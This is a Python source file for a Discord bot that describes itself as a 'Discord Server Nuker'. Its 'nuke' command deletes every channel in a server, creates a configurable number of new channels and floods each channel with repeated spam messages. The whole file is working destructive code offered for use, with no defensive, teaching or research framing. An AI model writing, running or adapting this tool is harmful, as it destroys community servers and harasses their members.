anyerror = False
try:
  import colorama
  import discord
  from discord.ext import commands
except:
  anyerror = True
if anyerror == True:
  print("Missing Module(s), Press Enter To Start Repair Process (Wont Always Work)")
  input("")
  try:
    import os
    os.system("pip install discord")
    os.system("pip install colorama")
    print("Problems Should Be Fixed Now, Restart The Program")
    input("")
    exit()
  except:
    print("Error While Fixing, Sorry")
    input("")
    exit()


try:
    import os
    from os import system
    system("title " + "Discord Server Nuker,   Made By blob#0005,   Github: github.com/blob0005")
except:
    pass


import json
try:
  json_data = open("settings.json")
  json_data = json.load(json_data)


  prefix = str(json_data["prefix"])
  amount_of_channels_to_create = int(json_data["amount_of_channels_to_create"])
  channel_names = str(json_data["channel_names"])
  token = str(json_data["bot_token"])
  msg = str(json_data["message_to_spam"])
  amount_of_messages_to_send_in_each_channel = int(json_data["amount_of_messages_to_send_in_each_channel"])
except:
  print('Missing "settings.json" File, It Stores All Settings')
  input("")
  exit()



#Bot Code
print("Starting Bot...")
colorama.init(autoreset=True)
bot = commands.Bot(command_prefix=prefix)
@bot.event
async def on_ready():
  print(colorama.Fore.GREEN + f"{bot.user.name} Is Up")
@bot.command()
async def nuke(ctx):
  channela = 0
  guilda = 0
  msga = 0
  try:
    await ctx.message.delete()
    print(colorama.Fore.GREEN + "Deleted Nuke Message")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            channela = int(channela) + 1
            print(colorama.Fore.GREEN + f"[{str(channela)}] Deleted Channel")
        except:
            print(colorama.Fore.RED + "Error While Deleting Channel")
    for u in range(int(amount_of_channels_to_create)):
        try:
            await ctx.guild.create_text_channel(channel_names)
            guilda = int(guilda) + 1
            print(colorama.Fore.GREEN + f"[{str(guilda)}] Created Guild")
        except:
            print(colorama.Fore.RED + "Error While Creating Guild")
    for channel in ctx.guild.channels:
        for u in range(amount_of_messages_to_send_in_each_channel):
            try:
                await channel.send(msg)
                msga = int(msga) + 1
                print(colorama.Fore.GREEN + f"[{str(msga)}] Sent Message")
            except:
                print(colorama.Fore.RED + "Error While Sending Message")
    print(f"Done Nuking {ctx.guild.id}/{ctx.guild.name}")
  except Exception as e:
      embed = discord.Embed(
          title="Error",
          description="Missing Permission/Rate Limited/Unkown Error"
      )
      print(colorama.Fore.RED + "[-] Missing Permission/Rate Limited/Unkown Error")
      await ctx.send(embed=embed)
bot.run(token, bot=True)
